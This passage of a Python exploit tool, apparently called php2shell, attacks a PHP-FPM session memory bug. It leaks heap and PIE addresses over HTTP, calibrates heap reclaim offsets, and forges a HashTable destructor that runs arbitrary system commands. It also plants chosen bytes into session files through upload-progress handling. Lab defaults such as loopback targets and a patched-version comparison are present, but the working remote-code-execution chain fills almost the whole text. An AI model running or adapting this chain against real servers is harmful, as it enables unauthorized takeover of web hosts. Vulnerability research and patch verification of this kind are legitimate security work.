    exhausting one shape's retries before trying the next lets that crash
    traffic degrade the heap state the remaining shapes would read.
    """
    shapes = [{"arm_path": arm_path, "pads": list(pads), "size": size,
               "header_content_off": LEAK_HEADER_GRID[0],
               "read_len": LEAK_READ_LEN}
              for pads, size in LEAK_SHAPES
              if LEAK_HEADER_GRID[0] + 0x18 < size]
    reads: dict[int, list] = {}      # shape index -> [(chunk_off, pie, read)]
    pending = list(range(len(shapes)))
    laps = 0
    while pending and laps < 6:
        laps += 1
        for idx in list(pending):
            geom = shapes[idx]
            read = _leak_read(base_url, builder_url, version, geom,
                              attempts=1)
            if read is None:
                continue
            chunk_ptrs, pie_ptrs = _scan_pointers(read)
            if not chunk_ptrs or not pie_ptrs:
                continue
            entry = reads.setdefault(idx, [])
            entry.append((chunk_ptrs, pie_ptrs))
            if os.environ.get("PHP2SHELL_DEBUG"):
                offs = [hex(o) for o, _v in chunk_ptrs[:4]]
                print(f"[debug] shape pads={geom['pads']} size={geom['size']}: "
                      f"full #{len(entry)} chunk_offs={offs}")
            if len(entry) < 2:
                continue
            prev_chunk, prev_pie = entry[-2]
            # set-based agreement: a read can carry extra stale pointers or
            # list them in a different order, so require a common offset+value
            stable_chunk = [(off, val) for off, val in chunk_ptrs
                            if (off, val) in prev_chunk]
            stable_pie = [(off, val) for off, val in pie_ptrs
                          if (off, val) in prev_pie]
            if os.environ.get("PHP2SHELL_DEBUG"):
                print(f"[debug] shape pads={geom['pads']} size={geom['size']}: "
                      f"{len(entry)} fulls, stable_chunk={len(stable_chunk)} "
                      f"stable_pie={len(stable_pie)}")
            if not stable_chunk or not stable_pie:
                continue
            chunk_off, chunk_ptr = stable_chunk[0]
            chunk = chunk_ptr & ~(MEM_CHUNK - 1)
            stable_pie.sort(key=lambda item: item[0], reverse=True)
            geometry = {
                "arm_path": arm_path,
                "pads": geom["pads"],
                "size": geom["size"],
                "header_content_off": hex(geom["header_content_off"]),
                "read_len": hex(LEAK_READ_LEN),
                "chunk_ptr_off": hex(chunk_off),
                "chunk_base_off": hex(chunk_ptr - chunk),
                "pie_ptr_off": None,    # set once a pointer proves its base
                "pie_base_off": None,   # ditto
                "bases": "discovered over HTTP with the calibrate command "
                         "(no /proc access)",
            }
            print(f"[+] leak geometry pads={geom['pads']} "
                  f"size={geom['size']} chunk_ptr_off=0x{chunk_off:x}, "
                  f"{len(stable_pie)} stable PIE-range pointers")
            pending.remove(idx)
            yield geometry, chunk_ptr, stable_pie


def _local_bases(version: str) -> tuple[int, int]:
    """PIE base and Zend-MM chunk base from /proc/<pid>/maps only.

    This deliberately does not open /proc/<pid>/mem: it is the local-lab
    fallback for the memory oracle (maps + the profile symbol offset).
    Remote targets use leak_bases_http() instead.
    """
    pid = find_pool_worker(version, "chain")
    if pid is None:
        raise RuntimeError(f"no php-fpm 'chain' worker for {version}")
    exe = os.readlink(f"/proc/{pid}/exe")
    pie = None
    chunk = None
    with open(f"/proc/{pid}/maps", encoding="utf-8") as handle:
        for line in handle:
            parts = line.split()
            start_s, end_s = parts[0].split("-")
            start, end = int(start_s, 16), int(end_s, 16)
            if (len(parts) >= 6 and parts[-1] == exe
                    and (pie is None or start < pie)):
                pie = start
            if chunk is None and "rw-p" in parts[1] and end - start >= MEM_CHUNK:
                base = (start + MEM_CHUNK - 1) & ~(MEM_CHUNK - 1)
                if base + MEM_CHUNK <= end:
                    chunk = base
    if pie is None or chunk is None:
        raise RuntimeError("could not derive PIE/chunk bases from maps")
    return pie, chunk


def cmd_leak(args) -> int:
    """Leak the chunk and PIE bases over HTTP and print them."""
    try:
        pie, chunk = leak_bases_http(args.base, args.builder, args.version,
                                     getattr(args, "arm_path", None))
    except (OSError, RuntimeError) as exc:
        print(f"[!] {exc}")
        return 1
    print(f"[+] chunk=0x{chunk:x} pie=0x{pie:x}")
    return 0


def cmd_no_oracle(args) -> int:
    """HTTP-only endgame: no /proc/<pid>/mem reads at exploit time.

    The absolute heap/PIE bases are stable for the lifetime of the FPM
    master (workers are forked from it).  They are leaked over HTTP, or
    supplied with --chunk/--pie.  This mode never uses /proc unless the
    explicit --allow-local-fallback lab flag is set; a failed HTTP leak is
    an error for a remote target.  The reclaim geometry is normalized with
    one throw-away pads+big request to a 404 endpoint (same allocation shape
    as _probe_cover, no scanning), then the (d-offset, content-offset) pair
    is brute-forced over the two slots and their possible cover offsets.
    """
    pie = getattr(args, "pie", 0)
    chunk = getattr(args, "chunk", 0)
    if not chunk or not pie:
        try:
            pie, chunk = leak_bases_http(args.base, args.builder, args.version,
                                         getattr(args, "arm_path", None))
            print("[*] bases from HTTP stale-string leak: "
                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
        except (OSError, RuntimeError) as exc:
            print(f"[!] HTTP leak failed: {exc}")
            if not getattr(args, "allow_local_fallback", False):
                print("[!] strict remote mode: refusing local /proc fallback")
                print("    retry the leak, or pass --chunk/--pie "
                      "(stable for the FPM master lifetime)")
                return 1
            try:
                pie, chunk = _local_bases(args.version)
            except (OSError, RuntimeError) as local_exc:
                print(f"[!] cannot auto-detect bases locally: {local_exc}")
                print("    pass --chunk/--pie (stable for the FPM master lifetime)")
                return 1
            print("[*] bases from /proc/<pid>/maps (no /proc/<pid>/mem): "
                  f"pie=0x{pie:x} chunk=0x{chunk:x}")
    zif = pie + _zif_offset(args.version)
    size, candidates, pads = _no_oracle_geometry(args.version)
    if getattr(args, "reclaim_pads", None):
        pads = [int(x) for x in args.reclaim_pads]
    if getattr(args, "reclaim_size", 0):
        size = int(args.reclaim_size)
    if getattr(args, "candidates", None):
        candidates = [(int(c[0], 0) if isinstance(c[0], str) else int(c[0]),
                       int(c[1], 0) if isinstance(c[1], str) else int(c[1]))
                      for c in args.candidates]
    layout = _layout(args.version)
    command = args.command.encode("latin1")
    if not command or b"\x00" in command:
        print("[!] command must be non-empty and contain no NUL bytes")
        return 1
    if len(command) > 0x57:
        print(f"[!] command too long ({len(command)} > 87 bytes)")
        return 1
    proof = (args.proof_file or "out/p1").lstrip("/")
    base = Target(args.base)
    chain404 = Target(args.base + PATHS["probe"])
    chainapp = Target(args.base + PATHS["app"])
    builder = builder_target(args.builder)
    local_proof = os.path.join(LAB, "webroot", proof)

    print(f"[*] no-oracle: chunk=0x{chunk:x} pie=0x{pie:x} zif=0x{zif:x}")
    tries = int(getattr(args, "tries", 8))
    for attempt in range(tries):
        d_off, k = candidates[attempt % len(candidates)]
        d = chunk + d_off
        with contextlib.suppress(OSError):
            os.remove(local_proof)
        parts = [{"name": f"pad{i}", "data": b"C" * pad}
                 for i, pad in enumerate(pads)]
        parts.append({"name": "big", "data": b"\x00" * size})
        if ARM_MODE == "growth":
            # everything that can reach RINIT on the chain pool runs first:
            # the growth arm is one-shot and any later request would memset
            # the stale state it just created.
            chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
            ref_session_post(builder, REF_SID)
            _remote_arm(args.base, args.builder, args.size)
        else:
            # arm #1, then normalize the post-arm heap with a pads+big request
            # that has the same allocation shape as the calibrated probe.
            _remote_arm(args.base, args.builder, args.size)
            chain404.post_multipart(parts, b"NORACLE0", timeout=120.0)
            # rebuild the ref session and re-arm (x WORKERS on multi-worker pools)
            ref_session_post(builder, REF_SID)
            _remote_arm(args.base, args.builder, args.size)
        forged = _build_endgame_payload(d, k, size, zif, command, layout)
        # One arm only lives in the worker that took the producer request, so
        # the consume is fanned out over the pool instead of hoping to land
        # on that one worker (a miss on an unarmed worker is a no-op request
        # and leaves the armed workers standing).
        for fan in range(WORKERS):
            status, _h, _b = _consume_b(chainapp, forged, pads)
            print(f"[*] attempt {attempt}.{fan}: d=0x{d:x} k=0x{k:x} "
                  f"status={status}")
            for _ in range(4):
                time.sleep(0.4)
                pstatus, _ph, pbody = base.get("/" + proof)
                if pstatus == 200 and pbody:
                    print(f"[+] RCE proof via /{proof}: {pbody[:120]!r}")
                    return 0
        print("    no proof, retrying")
    print(f"[!] no proof at /{proof}")
    return 1


def _wide_grid(version: str, start: int = 0x60000, end: int = 0xA0000,
               step: int = 0x800) -> list[tuple[int, int]]:
    """Every plausible slot of the chunk with the two common cover offsets.

    A build whose allocator places the recycled slot somewhere the small
    grids never look still gets a chance: the low half of the 2 MB Zend-MM
    chunk is scanned at 2 KB steps.  The band where the request heap has put
    the slot on every version so far is tried first, so the automatic search
    usually finishes within a few dozen attempts.
    """
    grid: list[tuple[int, int]] = []
    _size, candidates, _pads = _no_oracle_geometry(version)
    for slot in candidates:
        pair = (int(slot[0]), int(slot[1]))
        if pair not in grid:
            grid.append(pair)

    def band(low: int, high: int) -> None:
        for slot in range(low, high, step):
            for offset in (0xFE8, 0x1FE8):
                pair = (slot, offset)
                if pair not in grid:
                    grid.append(pair)

    band(0x78000, 0x88000)     # observed on 8.2/8.4 builds
    band(start, 0x78000)
    band(0x88000, end)
    return grid


def _remote_arm_and_normalize(base: str, builder: str, size: int,
                              pads: list[int], normalize: int) -> None:
    """Arm the stale state and normalize the heap with one pads+big request.

    Same shape as the endgame consume: build the 4 MB session, fire the
    producer, throw one pads+big request at a 404 endpoint so the heap
    looks the same on every attempt, then rebuild the reference session and
    re-arm.

    In growth mode everything that can reach RINIT on the chain pool (the
    normalize probe, the reference rebuild) runs *before* the arm, because
    the growth arm is one-shot: any later request would memset the stale
    state it just created.
    """
    chain404 = Target(base + PATHS["probe"])
    if ARM_MODE == "growth":
        chain404.post_multipart(
            [{"name": f"pad{i}", "data": b"C" * pad} for i, pad in enumerate(pads)]
            + [{"name": "big", "data": b"\x00" * normalize}],
            b"RMTNORM1", timeout=120.0)
        ref_session_post(builder_target(builder), REF_SID)
        _remote_arm(base, builder, size)
        return
    chain = Target(base)
    builder_t = builder_target(builder)
    big_session_post(builder_t, OOM_SID, 4 << 20)
    producer_get(chain, OOM_SID)
    parts = [{"name": f"pad{i}", "data": b"C" * pad}
             for i, pad in enumerate(pads)]
    parts.append({"name": "big", "data": b"\x00" * normalize})
    chain404.post_multipart(parts, b"RMTNORM1", timeout=120.0)
    ref_session_post(builder_t, REF_SID)
    big_session_post(builder_t, OOM_SID, 4 << 20)
    producer_get(chain, OOM_SID)


def _remote_primitive(base: str, builder: str, version: str, chunk: int,
                      d_off: int, k: int, size: int, pads: list[int],
                      value: int = 1337337) -> bool:
    """Consume with a forged IS_LONG zval and look for it in the response.

    The primitive needs no PIE base, which makes it the right probe for the
    reclaim geometry of an unknown build: it is a pure HTTP round trip whose
    answer tells whether the forged var_hash was picked up.
    """
    chainapp = Target(base + PATHS["app"])
    layout = _layout(version)
    _remote_arm_and_normalize(base, builder, size, pads, size)
    forged = _build_primitive_payload(chunk + d_off, k, size, value, layout)
    _status, _headers, body = _consume_b(chainapp, forged, pads)
    return str(value).encode() in body


def cmd_calibrate(args) -> int:
    """Full remote calibration of a build (HTTP requests only).

    Three phases, none of them reading /proc:

    1. leak geometry: where the forged zend_string header has to sit and
       which offsets carry the chunk/PIE pointers (``calibrate_leak_remote``);
    2. reclaim geometry: which (chunk offset, content offset) pair makes a
       forged zval observable through app.php (the primitive needs no PIE
       base, so it isolates the heap geometry);
    3. PIE base: the leaked pointer is rounded down to 2 MB boundaries and
       each candidate is validated with a remote endgame until the proof
       file appears.

    The result is written into profiles/<version>-fpm.json, so afterwards
    ``no-oracle`` works against the same build with no further calibration.
    """
    version = args.version
    print(f"[*] remote calibration of PHP {version}")

    # ---- phase 0: draft the profile from the build itself ---------------
    # The later phases need zif_system and the struct layouts, which only
    # live in the profile, and a brand new version has none yet: draft it
    # here (symbols via nm, layouts compiled from the build's own headers).
    profile_path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    if not os.path.isfile(profile_path):
        import php2shell_fpm_profile as profile_gen
        names = sorted(name for name in os.listdir(os.path.join(ROOT, "profiles"))
                       if name.endswith("-fpm.json"))
        if not names:
            print("[!] no template profile to draft from")
            return 1
        try:
            profile_gen.generate(version,
                                 os.path.join(ROOT, "profiles", names[0]),
                                 profile_path, "debian", "amd64", None, True)
        except (OSError, RuntimeError, ValueError, KeyError, TypeError) as exc:
            print(f"[!] cannot draft a profile for {version}: {exc}")
            return 1
        print(f"[+] draft profile for {version}: symbols and layouts extracted")

    # ---- phase 1: leak geometries ---------------------------------------
    # Collect lazily and stop at the first few winners: draining the whole
    # generator keeps sending reads after the geometry is known, and that
    # much crash traffic degrades the heap state the remaining shapes read.
    geometries: list = []

    def harvest() -> None:
        for item in leak_geometry_candidates(args.base, args.builder, version):
            geometries.append(item)
            if len(geometries) >= 3:
                break

    harvest()
    if not geometries:
        print("[*] no stable geometry on the first sweep; retrying once")
        harvest()
    if not geometries:
        print("[!] no leak geometry found over HTTP")
        return 1
    chunk_ptr = geometries[0][1]
    chunk = chunk_ptr & ~(MEM_CHUNK - 1)

    # ---- phase 2: reclaim geometry via the remote primitive --------------
    _size, candidates, pads = _no_oracle_geometry(version)
    if getattr(args, "reclaim_pads", None):
        pads = [int(x) for x in args.reclaim_pads]
    reclaim_size = int(getattr(args, "reclaim_size", 0) or _size)
    shapes = [(list(pads), reclaim_size)]
    for alt_pads, alt_size in (([4096, 4096], 16384),
                               ([4096, 4096], 12288),
                               ([4096, 4096, 4096], 16384),
                               ([4096], 16384),
                               ([8192, 4096], 16384),
                               ([4096, 4096], 24576),
                               ([32768], 16384),
                               ([4096, 4096], 32768)):
        if (alt_pads, alt_size) not in shapes:
            shapes.append((alt_pads, alt_size))
    grid = [(int(c[0]), int(c[1])) for c in candidates]
    for pair in _wide_grid(version):
        if pair not in grid:
            grid.append(pair)
    winners: list[tuple[int, int]] = []
    used_shape: list[int] | None = None
    used_size = reclaim_size
    for shape_pads, shape_size in shapes:
        print(f"[*] probing pads={shape_pads} size={shape_size} "
              f"({len(grid)} pairs)")
        extra = 24
        for d_off, k in grid[:int(args.attempts)]:
            if k + 0x900 > shape_size:
                continue    # the forged objects would not fit the buffer
            try:
                hit = _remote_primitive(args.base, args.builder, version, chunk,
                                        d_off, k, shape_size, shape_pads)
            except (OSError, RuntimeError, TimeoutError) as exc:
                print(f"    0x{d_off:x}/0x{k:x}: {exc}")
                continue
            print(f"    0x{d_off:x}/0x{k:x}: "
                  f"{'observable' if hit else 'not observable'}")
            if hit:
                winners.append((d_off, k))
                used_shape, used_size = list(shape_pads), shape_size
                # the 8 KB slot recycles between two addresses, so a bounded
                # number of extra pairs is probed for the second one; the
                # endgame cycles through whatever was found
                extra -= 1
                if len(winners) >= 4 or extra <= 0:
                    break
        if winners:
            break
    if not winners:
        print("[!] no reclaim candidate is observable over HTTP")
        return 1
    pads, reclaim_size = used_shape or pads, used_size
    print(f"[*] reclaim candidates: "
          f"{', '.join(f'0x{d:x}/0x{k:x}' for d, k in winners)}")

    # ---- phase 3: PIE base via the remote endgame ------------------------
    proof = (args.proof_file or "out/calib").lstrip("/")
    local_proof = os.path.join(LAB, "webroot", proof)
    zif_off = _zif_offset(version)
    # The r-x mapping of a PHP build starts one 2MB page into the binary and
    # holds a few MB of code, so only pointers that can sit inside it are
    # worth a base candidate: stale heap values (which are stable across two
    # reads as well) are skipped without spending a request on them.  When a
    # geometry carries no code pointer at all the next geometry is tried,
    # because the OOB read has to actually span the handler table.
    code_low, code_high = PIE_CODE_WINDOW
    pie = None
    geometry = None
    chosen: tuple[int, int] | None = None
    budget = int(getattr(args, "budget", 160))
    for candidate_geometry, geometry_chunk, pie_pointers in geometries:
        geometry_chunk &= ~(MEM_CHUNK - 1)
        # one base is one guess: junk clusters repeat the same derived base
        # for every pointer, and the budget is global
        seen_bases: set[int] = set()
        for pie_off, pie_ptr in pie_pointers:
            aligned = pie_ptr & ~(MEM_CHUNK - 1)
            for steps in range(0, 6):
                candidate = aligned - steps * MEM_CHUNK
                if candidate <= 0:
                    break
                if candidate in seen_bases:
                    continue
                seen_bases.add(candidate)
                offset = pie_ptr - candidate
                if offset >= code_high:
                    break    # further steps only push it out of the code
                if offset < code_low:
                    continue # the base is still too high
                if budget <= 0:
                    break
                budget -= 1
                with contextlib.suppress(OSError):
                    os.remove(local_proof)
                print(f"[*] PIE candidate ptr=0x{pie_ptr:x} "
                      f"@leak+0x{pie_off:x} base=0x{candidate:x} "
                      f"(zif=0x{candidate + zif_off:x})")
                attempt = argparse.Namespace(**vars(args))
                attempt.chunk, attempt.pie = geometry_chunk, candidate
                attempt.candidates = list(winners)
                attempt.proof_file = proof
                attempt.command = f"id>{proof}"
                attempt.reclaim_pads, attempt.reclaim_size = pads, reclaim_size
                attempt.tries = max(4, 2 * len(winners))
                if cmd_no_oracle(attempt) == 0:
                    pie, geometry = candidate, candidate_geometry
                    chosen = (pie_off, pie_ptr)
                    chunk = geometry_chunk
                    break
            if pie is not None:
                break
        if pie is not None:
            break
    if pie is None or geometry is None or chosen is None:
        print("[!] no PIE base candidate produced a proof")
        return 1
    geometry["pie_ptr_off"] = hex(chosen[0])
    geometry["pie_base_off"] = hex(chosen[1] - pie)
    zif = pie + zif_off
    print(f"[+] remote calibration solved: chunk=0x{chunk:x} pie=0x{pie:x} "
          f"zif=0x{zif:x}")

    if not getattr(args, "update_profile", True):
        return 0

    # ---- persist ---------------------------------------------------------
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            profile = json.load(handle)
        winners_field = [{"d_off": hex(d_off), "k": hex(k)}
                         for d_off, k in winners]
        if ARM_MODE == "growth":
            # single-surface amplifier arm: keep the classic two-surface
            # geometry (the live CI lab runs on it) and store this one
            # under fpm.growth
            growth = profile["fpm"].setdefault("growth", {})
            growth["leak"] = geometry
            growth["candidates"] = winners_field
            growth["reclaim_pads"] = list(pads)
            growth["reclaim_size"] = reclaim_size
        else:
            profile["fpm"]["leak"] = geometry
            profile["fpm"]["no_oracle"]["candidates"] = winners_field
            profile["fpm"]["no_oracle"]["reclaim_pads"] = list(pads)
            profile["fpm"]["no_oracle"]["reclaim_size"] = reclaim_size
            profile["fpm"]["reclaim_pads"] = list(pads)
            profile["fpm"]["reclaim_size"] = reclaim_size
        profile["fpm"]["no_oracle"]["bases"] = (
            "chunk from the 2MB-aligned leaked pointer, PIE base validated "
            "with a remote endgame; both stable for the FPM master lifetime")
        profile["verified"] = True
        profile["rce"] = True
        profile["status"] = (
            f"RCE verified over HTTP only (no /proc access): the stale-string "
            f"leak recovered chunk=0x{chunk:x} and the PIE base 0x{pie:x} "
            f"(leak+{geometry['pie_ptr_off']} -> {geometry['pie_base_off']}); "
            f"the primitive at "
            f"{', '.join(f'0x{d:x}/0x{k:x}' for d, k in winners)} was "
            f"observable through app.php and the forged HashTable destructor "
            f"executed zif_system (proof: out/{proof}).")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(profile, handle, indent=2)
            handle.write("\n")
        print(f"[+] profile updated: {path}")
    except (OSError, KeyError, TypeError, ValueError) as exc:
        print(f"[!] could not update the profile: {exc}")
        return 1
    return 0


def cmd_probe(args) -> int:
    """Check every precondition of the chain against one target, HTTP only.

    Turns the "stellar alignments" checklist into a report: vulnerable
    version, application session operation, reflection channel, reference
    endpoint, accumulating endpoint, and the decisive memory physics - can
    a decode OOM be reached on this surface at all?  The arm check grows a
    session up to the decode wall of the target, so it sends a few hundred
    small POSTs; everything else is a handful of requests.
    """
    base = args.base
    version = args.version
    ok = True

    def report(status: str, label: str, detail: str) -> None:
        print(f"[{status}] {label:<10} {detail}")

    print(f"[*] probing {base} as PHP {version}")

    # ---- 1. version registry -------------------------------------------
    try:
        if registry.is_fixed(version):
            report("-", "version",
                   f"{version} is fixed ({registry.fixed_in(version)} ships "
                   f"php_basic_early_rinit): the stale state is cleared")
            ok = False
        elif not registry.chain_applies(version):
            report("-", "version",
                   f"{version} is vulnerable but never freed the struct "
                   f"(no php_session_cancel_decode): only 'poison' applies")
            ok = False
        else:
            fixed = registry.fixed_in(version)
            report("+", "version",
                   f"{version} vulnerable" + (f" (fixed in {fixed})" if fixed
                                              else " (never patched)"))
    except registry.UnknownVersion as exc:
        report("!", "version", str(exc))

    target = Target(base)
    app = Target(base + PATHS["app"])
    sid = b"probe" + os.urandom(6).hex().encode("latin1")
    ref_sid = b"probe" + os.urandom(6).hex().encode("latin1")

    # ---- 2. accumulating endpoint (the growth arm's app operation) -----
    grow_ok = False
    try:
        status, _headers, body = target.post_urlencoded(
            {"k": "probe0", "v": "PRBMARK"}, cookie=_cookie(sid),
            path=PATHS["grow"], timeout=60.0)
        grow_ok = b"GROW_OK" in _dechunk(body)
        report("+" if grow_ok else "-", "growth",
               f"{PATHS['grow']} appends to the session" if grow_ok else
               f"{PATHS['grow']} answered {status} without GROW_OK")
    except OSError as exc:
        report("-", "growth", f"{PATHS['grow']} unreachable ({exc})")
    if not grow_ok:
        ok = False

    # ---- 3. session_start + reflection ---------------------------------
    try:
        _status, _headers, body = app.get(PATHS["app"], cookie=_cookie(sid),
                                          timeout=60.0)
        reflected = b"probe0\tPRBMARK" in _dechunk(body)
        report("+" if reflected else "-", "app",
               f"{PATHS['app']} starts the session and reflects values"
               if reflected else
               f"{PATHS['app']} did not reflect the planted value "
               f"(needed for the HTTP leak; pass --chunk/--pie without it)")
        ok = ok and reflected
    except OSError as exc:
        report("-", "app", f"{PATHS['app']} unreachable ({exc})")
        ok = False

    # ---- 4. reference-bearing session ----------------------------------
    ref_ok = False
    try:
        target.post_urlencoded({"x": "1"}, cookie=_cookie(ref_sid),
                               path=PATHS["ref"], timeout=60.0)
        _status, _headers, body = app.get(PATHS["app"],
                                          cookie=_cookie(ref_sid), timeout=60.0)
        ref_ok = b"r\tx" in _dechunk(body)
        report("+" if ref_ok else "-", "reference",
               f"{PATHS['ref']} stores a reference (the R:N hook)"
               if ref_ok else f"{PATHS['ref']} did not reflect a reference")
    except OSError as exc:
        report("-", "reference", f"{PATHS['ref']} unreachable ({exc})")
    if not ref_ok:
        ok = False

    # ---- 5. the arm: can a decode OOM be reached here? ------------------
    armed = False
    if grow_ok:
        print("[*] arm: trying a decode-side OOM (one amplified "
              "session_decode, growth as fallback) ...")
        armed = grow_until_armed(base)
        report("+" if armed else "-", "arm",
               "decode OOM reached: BG(unserialize) arms" if armed else
               "no decode OOM reachable: the surface saves more than it "
               "can decode (session.lazy_write=Off, a lower consumer "
               "memory_limit, or a bigger --arm-body needed)")
    else:
        report("-", "arm", "skipped: no accumulating endpoint")
    ok = ok and armed

    # ---- 6. workers ----------------------------------------------------
    report("=", "workers",
           "not measurable over HTTP: pass --workers ~ pm.max_children "
           "(default 5); the consume fans out over them")

    if ok:
        print("[+] every precondition holds: run 'no-oracle'")
        return 0
    print("[!] missing preconditions listed above")
    return 1


def cmd_poison(args) -> int:
    """Plant chosen bytes into a chosen session file (upload-progress logic).

    The ``MULTIPART_EVENT_FORMDATA`` handler copies the session id straight
    from the POST body without consulting ``session.use_only_cookies``, and
    ``MULTIPART_EVENT_FILE_START`` then installs it as ``PS(id)``.  The
    progress data -- which carries the upload filename -- is therefore
    written to ``sess_<sid>`` of the attacker's choice, and the builder pool
    keeps it because ``session.upload_progress.cleanup=Off``.

    This is the chain that applies to every version with
    ``session.upload_progress`` enabled, including PHP <= 7.x where the
    struct-freeing chain of this repository does not apply (no
    ``php_session_cancel_decode``).  It is pure HTTP: the planted bytes are
    read back through the application, which deserializes the session and
    reflects its contents.  Turning the plant into RCE additionally needs an
    application gadget or a local file include; core PHP only gives the
    arbitrary session-file write.
    """
    sid = args.sid.encode("latin1")
    if not sid:
        print("[!] --sid is required")
        return 1
    payload = args.payload.encode("latin1")
    progress_key = (getattr(args, "progress_key", None) or "pwn").encode("latin1")
    builder = builder_target(args.builder)
    app = Target(args.base + PATHS["app"])

    parts = [
        # POST-body session id: fixes which file the progress data lands in
        {"name": PATHS["cookie"], "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": progress_key},
        # the filename is the byte string planted into that file
        {"name": "f", "filename": payload, "data": b"x" * 8},
    ]
    status, _headers, _body = builder.post_multipart(parts, b"POISON001",
                                                     timeout=180.0)
    print(f"[*] plant status={status} sid={sid.decode('latin1')!r} "
          f"payload={payload[:60]!r}")

    path = session_file(args.version, sid)
    on_disk = b""
    if os.path.isfile(path):
        with open(path, "rb") as handle:
            on_disk = handle.read()
        print(f"[*] session file {path} ({len(on_disk)} bytes)")

    # read it back through the application over HTTP
    _status, _headers, body = app.get(PATHS["app"], cookie=_cookie(sid))
    planted = payload in body
    print(f"[*] application reflects the session: "
          f"{'YES' if planted else 'no'}")
    if planted:
        index = body.find(payload)
        print(f"    ...{body[max(0, index - 40):index + len(payload) + 8]!r}")
    ok = planted or (payload in on_disk)
    print(f"[+] plant {'VERIFIED' if ok else 'FAILED'}")
    return 0 if ok else 1


def cmd_chain(args) -> int:
    print(f"[*] chain: build sessions -> producer -> consumer ({args.phase} phase)")
    builder = builder_target(args.builder)
    if not os.path.isfile(session_file(args.version, OOM_SID)):
        print("[*] build-oom")
        big_session_post(builder, OOM_SID, 4 << 20)
    if not os.path.isfile(session_file(args.version, REF_SID)):
        print("[*] build-ref")
        ref_session_post(builder, REF_SID)
    chain = Target(args.base)
    status, body = producer_get(chain, OOM_SID)
    print(f"[*] producer status={status} body={body[:80]!r}")
    oracle = Oracle(args.version)
    d = oracle.unserialize_data()
    print(f"[*] BG.data=0x{d:x} level={oracle.unserialize_level()}")
    if args.phase == "primitive":
        return cmd_primitive(args)
    if args.phase == "endgame":
        return cmd_endgame(args)
    return 0


def cmd_patchcheck(args) -> int:
    """Compare a vulnerable release with the release that fixed its branch.

    The fixed counterpart comes from the version registry, so any branch
    works (8.2, 8.3, 8.4, 8.5): the vulnerable build must arm the stale
    state after the producer OOM, and the patched build must not.
    """
    vulnerable = args.version
    fixed = registry.fixed_in(vulnerable)
    if fixed is None:
        print(f"[!] {vulnerable} belongs to a branch that was never patched "
              f"(no fixed release to compare against)")
        return 1
    pair = [vulnerable, fixed]
    try:
        import php2shell_fpm_labs as labs
        ports = {version: lab_ports[:2]
                 for version, lab_ports in labs.builds_map(pair).items()}
    except Exception:  # noqa: BLE001 - lab module not importable
        ports = {version: registry.ports_for(version)[:2] for version in pair}

    print(f"[*] comparing vulnerable {vulnerable} with fixed {fixed}")
    for version in pair:
        base = f"http://127.0.0.1:{ports[version][0]}"
        builder_url = f"http://127.0.0.1:{ports[version][1]}"
        print(f"\n=== {version} ===")
        chain_t = Target(base)
        builder = builder_target(builder_url)
        if not os.path.isfile(session_file(version, OOM_SID)):
            big_session_post(builder, OOM_SID, 4 << 20)
        # lifecycle
        worker = find_pool_worker(version, "chain")
        status, _body = producer_get(chain_t, OOM_SID)
        time.sleep(0.2)
        worker2 = find_pool_worker(version, "chain")
        print(f"producer status={status} worker {worker}->{worker2} "
              f"({'DIED' if worker != worker2 else 'survived'})")
        try:
            oracle = Oracle(version)
            d = oracle.unserialize_data()
            level = oracle.unserialize_level()
            print(f"BG.data=0x{d:x} level={level} "
                  f"{'STALE-ARMED' if d and level == 1 else 'clean'}")
        except RuntimeError as exc:
            print(f"oracle: {exc}")
    print(f"\n[*] expected: {vulnerable} STALE-ARMED, {fixed} clean "
          f"(php_basic_early_rinit memsets BG before body parse)")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    parser.add_argument("--base", default="http://127.0.0.1:8110")
    parser.add_argument("--allow-remote", action="store_true",
                        help="allow non-loopback --base/--builder targets "
                             "(written authorization required)")
    parser.add_argument("--builder", default=None,
                        help="builder surface URL (default: same origin as "
                             "--base, which selects the growth arm)")
    parser.add_argument("--builder-prefix", default="",
                        help="path prefix of the builder pool when both pools "
                             "share one port, e.g. /b (single-origin classic mode)")
    parser.add_argument("--arm-mode", choices=("auto", "builder", "growth"),
                        default="auto",
                        help="auto: growth when --builder is the same origin as "
                             "--base without a prefix, builder otherwise")
    parser.add_argument("--workers", type=int, default=5,
                        help="arm/consume fan-out; matches pm.max_children=5 "
                             "of a default php-fpm pool (use 1 only for a "
                             "pinned single-worker pool)")
    parser.add_argument("--grow-path", default=None,
                        help="endpoint that appends POST k/v to the session "
                             "(default /grow.php)")
    parser.add_argument("--grow-chunk", type=int, default=0,
                        help="bytes appended to the session per growth round "
                             "(default 262144; keep below the target's "
                             "client_max_body_size/3)")
    parser.add_argument("--grow-max", type=int, default=0,
                        help="growth rounds before the big-body probe (default 4000)")
    parser.add_argument("--arm-body", type=int, default=0,
                        help="body bytes of the OOM probe after a stalled "
                             "growth (default 921600; must exceed "
                             "--grow-chunk*2 + the growth body)")
    parser.add_argument("--version", default="8.4.26")
    parser.add_argument("--sid", default=OOM_SID.decode())
    parser.add_argument("--size", type=int, default=4 << 20)
    parser.add_argument("--value", type=int, default=424242)
    parser.add_argument("--pad", type=int, default=0)
    parser.add_argument("--sweep", default=None,
                        help="comma-separated pad sizes for reclaim-probe")
    parser.add_argument("--oracle", action="store_true")
    parser.add_argument("--phase", choices=("probe", "primitive", "endgame"),
                        default="primitive")
    parser.add_argument("--command", default="id>out/p1")
    parser.add_argument("--proof-file", default="out/p1")
    parser.add_argument("--chunk", type=lambda x: int(x, 0), default=0)
    parser.add_argument("--pie", type=lambda x: int(x, 0), default=0)
    parser.add_argument("--app-path", default=None,
                        help="session application operation path (default /app.php)")
    parser.add_argument("--arm-path", default=None,
                        help="stale-session arm path (default profile or /bigvar.php)")
    parser.add_argument("--ref-path", default=None,
                        help="reference-bearing session builder path (default /ref.php)")
    parser.add_argument("--probe-path", default=None,
                        help="404/no-op path used for reclaim probes (default /nope.php)")
    parser.add_argument("--session-cookie", default=None,
                        help="session cookie name (default PHPSESSID)")
    sub = parser.add_subparsers(dest="cmd", required=True)
    for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                 "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
